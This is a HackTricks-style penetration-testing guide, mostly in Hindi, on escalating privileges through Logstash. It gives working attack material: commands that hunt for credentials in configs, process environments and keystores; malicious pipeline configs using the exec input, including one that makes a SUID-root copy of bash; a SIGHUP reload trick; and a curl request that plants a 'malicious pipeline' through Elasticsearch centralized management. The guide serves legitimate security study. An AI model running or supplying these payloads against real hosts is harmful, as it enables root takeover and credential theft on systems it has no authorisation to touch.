# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash का उपयोग **logs को gather, transform और dispatch करने** के लिए किया जाता है, जिसे **pipelines** के नाम से जाना जाता है। ये pipelines **input**, **filter** और **output** stages से मिलकर बनी होती हैं। जब Logstash किसी compromised machine पर चलता है, तो एक interesting पहलू सामने आता है।

### Pipeline Configuration

Pipelines को **/etc/logstash/pipelines.yml** file में configure किया जाता है, जिसमें pipeline configurations के locations सूचीबद्ध होते हैं:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
यह file उन **.conf** files का स्थान बताती है, जिनमें pipeline configurations होती हैं। **Elasticsearch output module** का उपयोग करते समय, **pipelines** में **Elasticsearch credentials** शामिल होना आम बात है। इनमें अक्सर व्यापक privileges होते हैं, क्योंकि data को Elasticsearch में लिखने के लिए Logstash को इनकी आवश्यकता होती है। Configuration paths में मौजूद wildcards Logstash को निर्धारित directory में मौजूद सभी matching pipelines execute करने की अनुमति देते हैं।

यदि Logstash को `pipelines.yml` के बजाय `-f <directory>` के साथ start किया जाता है, तो उस directory के अंदर मौजूद **सभी files** को lexicographical order में concatenate करके एक single config के रूप में parse किया जाता है। इससे 2 offensive implications उत्पन्न होते हैं:

- `000-input.conf` या `zzz-output.conf` जैसी dropped file final pipeline के assemble होने के तरीके को बदल सकती है
- कोई malformed file पूरी pipeline को load होने से रोक सकती है, इसलिए auto-reload पर निर्भर करने से पहले payloads को सावधानीपूर्वक validate करें

### Compromised Host पर Fast Enumeration

जिस box पर Logstash installed हो, वहां जल्दी से inspect करें:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
यह भी जांचें कि क्या local monitoring API तक पहुंच संभव है। डिफ़ॉल्ट रूप से यह **127.0.0.1:9600** पर bind होती है, जो host पर पहुंच बनाने के बाद आमतौर पर पर्याप्त होता है:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
यह आमतौर पर आपको pipeline IDs, runtime details और यह पुष्टि देता है कि आपका modified pipeline load हो चुका है।

Logstash से recovered Credentials अक्सर **Elasticsearch** को unlock कर देते हैं, इसलिए [Elasticsearch के बारे में यह अन्य page देखें](../../network-services-pentesting/9200-pentesting-elasticsearch.md)।

### Writable Pipelines के माध्यम से Privilege Escalation

Privilege Escalation का प्रयास करने के लिए, पहले उस user की पहचान करें जिसके तहत Logstash service चल रही है; आमतौर पर यह **logstash** user होता है। सुनिश्चित करें कि आप इनमें से **एक** criterion पूरा करते हों:

- आपके पास किसी pipeline **.conf** file पर **write access** हो **या**
- **/etc/logstash/pipelines.yml** file में wildcard का उपयोग हो और आप target folder में लिख सकते हों

इसके अतिरिक्त, इनमें से **एक** condition पूरी होनी चाहिए:

- Logstash service को restart करने की capability हो **या**
- **/etc/logstash/logstash.yml** file में **config.reload.automatic: true** सेट हो

Configuration में wildcard होने पर, इस wildcard से match करने वाली file बनाने से command execution संभव हो जाता है। उदाहरण के लिए:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
यहाँ, **interval** execution frequency को seconds में निर्धारित करता है। दिए गए उदाहरण में, **whoami** command हर 120 seconds में चलती है और इसका output **/tmp/output.log** में भेजा जाता है।

**/etc/logstash/logstash.yml** में **config.reload.automatic: true** के साथ, Logstash बिना restart की आवश्यकता के नई या modified pipeline configurations को automatically detect और apply करेगा। यदि कोई wildcard नहीं है, तो existing configurations में modifications फिर भी किए जा सकते हैं, लेकिन disruptions से बचने के लिए सावधानी बरतने की सलाह दी जाती है।

### अधिक Reliable Pipeline Payloads

`exec` input plugin वर्तमान releases में अभी भी काम करता है और इसके लिए `interval` या `schedule` में से किसी एक की आवश्यकता होती है। यह Logstash JVM को **forking** करके execute करता है, इसलिए यदि memory कम है, तो आपका payload silently run होने के बजाय **ENOMEM** के साथ fail हो सकता है।

एक अधिक practical privilege-escalation payload आमतौर पर ऐसा होता है जो एक durable artifact छोड़ता है:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
यदि आपके पास restart करने के अधिकार नहीं हैं, लेकिन आप process को signal भेज सकते हैं, तो Unix-like systems पर Logstash **SIGHUP**-triggered reload को भी support करता है:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
ध्यान रखें कि हर plugin reload-friendly नहीं होता। उदाहरण के लिए, **stdin** input automatic reload को रोकता है, इसलिए यह न मानें कि `config.reload.automatic` हमेशा आपके बदलावों को लागू कर देगा।

### Logstash से Secrets चुराना

केवल code execution पर ध्यान केंद्रित करने से पहले, उस data को harvest करें जिस तक Logstash की पहले से पहुंच है:

- Plaintext credentials अक्सर `elasticsearch {}` outputs, `http_poller`, JDBC inputs या cloud-संबंधित settings में hardcode किए होते हैं
- Secure settings **`/etc/logstash/logstash.keystore`** या किसी अन्य `path.settings` directory में हो सकती हैं
- Keystore password अक्सर **`LOGSTASH_KEYSTORE_PASS`** के माध्यम से दिया जाता है, और package-based installs में आमतौर पर इसे **`/etc/sysconfig/logstash`** से source किया जाता है
- `${VAR}` के साथ Environment-variable expansion Logstash startup के समय resolve होता है, इसलिए service environment की जांच करना उपयोगी है

Useful checks:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
यह जांचना भी महत्वपूर्ण है क्योंकि **CVE-2023-46672** से पता चला कि कुछ विशेष परिस्थितियों में Logstash logs में sensitive information रिकॉर्ड कर सकता है। इसलिए post-exploitation host पर पुराने Logstash logs और `journald` entries credentials disclose कर सकते हैं, भले ही वर्तमान config secrets को inline store करने के बजाय keystore को reference करती हो।

### Centralized Pipeline Management Abuse

कुछ environments में host local `.conf` files पर बिल्कुल निर्भर नहीं होता। यदि **`xpack.management.enabled: true`** configured है, तो Logstash Elasticsearch/Kibana से centrally managed pipelines pull कर सकता है, और इस mode को enable करने के बाद local pipeline configs source of truth नहीं रहते।

इसका अर्थ है कि एक अलग attack path मौजूद है:

1. Local Logstash settings, keystore या logs से Elastic credentials recover करें
2. Verify करें कि account के पास **`manage_logstash_pipelines`** cluster privilege है
3. Centrally managed pipeline create या replace करें, ताकि Logstash host अपने अगले poll interval पर आपका payload execute करे

इस feature के लिए इस्तेमाल की जाने वाली Elasticsearch API है:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
यह विशेष रूप से तब उपयोगी है जब local files read-only हों, लेकिन Logstash पहले से ही pipelines को remotely fetch करने के लिए registered हो।

## References

- [Elastic Docs: Config File को Reload करना](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Centralized Pipeline Management को Configure करना](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
